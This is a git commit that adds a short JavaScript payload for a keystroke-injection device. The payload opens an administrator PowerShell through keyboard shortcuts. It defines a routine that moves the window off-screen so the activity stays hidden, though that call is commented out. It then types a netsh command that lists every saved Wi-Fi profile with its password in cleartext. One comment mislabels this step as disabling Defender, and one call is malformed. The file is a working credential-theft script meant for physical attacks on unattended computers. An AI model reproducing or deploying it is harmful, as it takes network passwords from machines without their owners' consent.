85abdf441e6300fbdf989a22b85b0bd31342ed1e
Nexr0n <39227048+Nexr0n@users.noreply.github.com>
2020-05-25 16:49:09 -0700

    Add files via upload

---
+++ scrapeWiFi.js
@@ -0,0 +1,33 @@
+function fast() { //sets typing speed as fast as possible with no randomness 
+  typingSpeed(0,0)
+}
+function startPS() { //starts powershell (if fails on slower computers extend the delays and see if that helps)
+	press("GUI x");
+	delay(50);
+	press("a");
+	delay(500);
+	press("LEFT");
+	delay(50);
+	press("ENTER");
+	delay(200);
+}
+function hidePS() { //moves powershell window far outside of screeen coords but keeps window in focus to allow typing off screen
+	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
+  	press("ENTER");
+}
+function scrapeWiFi() { //disables windows defender real time monitoring
+	type('(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize ')
+	press("ENTER");
+	delay(200);
+}
+function exitPS() { //exits Powershell
+	type("exit")
+	press("ENTER");
+}
+
+layout('us');
+fast();
+startPS();
+//hidePS();
+scrapeWiFi()();
+exitPS();
